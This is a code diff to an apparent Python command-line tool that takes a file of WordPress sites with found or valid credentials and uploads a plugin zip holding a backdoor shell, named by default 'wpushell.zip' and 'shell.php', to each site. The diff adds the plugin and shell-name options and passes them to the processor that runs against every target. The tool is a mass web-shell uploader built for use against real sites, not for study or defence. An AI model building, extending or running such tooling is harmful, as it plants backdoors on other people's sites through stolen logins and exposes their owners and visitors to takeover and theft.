@@ -23,6 +23,7 @@ import os
 import sys
 import asyncio
 
+from argparse import FileType
 from argparse import ArgumentParser
 from argparse import RawDescriptionHelpFormatter
 from argparse import SUPPRESS
@@ -43,6 +44,11 @@ def setup_argument_parser() -> ArgumentParser:
 
     parser.add_argument('target_file', nargs='?', help='list of target sites stored in a file along with the found or valid credentials')
     parser.add_argument('-fstdin', '--target-from-stdin', action='store_true', help=SUPPRESS)
+    parser.add_argument('-n', '--no-progressbar', action='store_true', default=False, help='disable progress bar output for execution program')
+
+    target_group = parser.add_argument_group('target options')
+    target_group.add_argument('-p', '--plugin', action='store', metavar='', default=f'{Path.cwd()}/wpushell.zip', type=FileType('rb'), help='path to wordpress plugin that will be uploaded to the target site (default: %(default)s)')
+    target_group.add_argument('-s', '--shell-name', action='store', metavar='', default='shell.php', help='name of the backdoor shell that is in the wordpress plugin zip file to be uploaded (default: %(default)s')
 
     return parser
 
@@ -91,7 +97,11 @@ async def main(args: list) -> None:
     for target in data:
         input_data.append(InputData(target))
 
-    processor = Processor()
+    processor = Processor(
+        no_progressbar=args.no_progressbar,
+        plugin_content=args.plugin,
+        shell_name=args.shell_name
+    )
     results = await processor.run(input_data)
     print(results)
 
